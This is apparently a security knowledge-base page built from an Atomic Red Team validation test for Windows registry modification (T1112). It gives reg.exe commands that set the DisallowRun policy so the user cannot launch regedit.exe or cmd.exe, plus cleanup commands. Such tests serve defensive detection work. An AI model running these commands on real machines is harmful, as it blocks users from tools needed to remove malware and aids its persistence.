---
atomic_guid: "71db768a-5a9c-4047-b5e7-59e01f188e84"
title: "DisallowRun Execution Of Certain Applications"
framework: "atomic"
generated: "true"
attack_technique_id: "T1112"
attack_technique_name: "Modify Registry"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1112/T1112.yaml"
build_date: "2026-04-27 19:12:27"
executor: "command_prompt"
aliases:
  - "71db768a-5a9c-4047-b5e7-59e01f188e84"
  - "DisallowRun Execution Of Certain Applications"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Modify the registry of the currently logged in user using reg.exe via cmd console to prevent user running specific computer programs that could aid them in manually removing malware or detecting it 
using security product.

## ATT&CK Mapping

- [[kb/attack/techniques/T1112-modify_registry|T1112: Modify Registry]]

## Executor

- elevation_required: True
- name: command_prompt

### Command

```cmd
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v DisallowRun /t REG_DWORD /d 1 /f
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun /f /t REG_SZ /v art1 /d "regedit.exe"
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun /f /t REG_SZ /v art2 /d "cmd.exe"
```

### Cleanup

```cmd
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v DisallowRun /f >nul 2>&1
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun /v art1 /f >nul 2>&1
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun /v art2 /f >nul 2>&1
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1112/T1112.yaml)
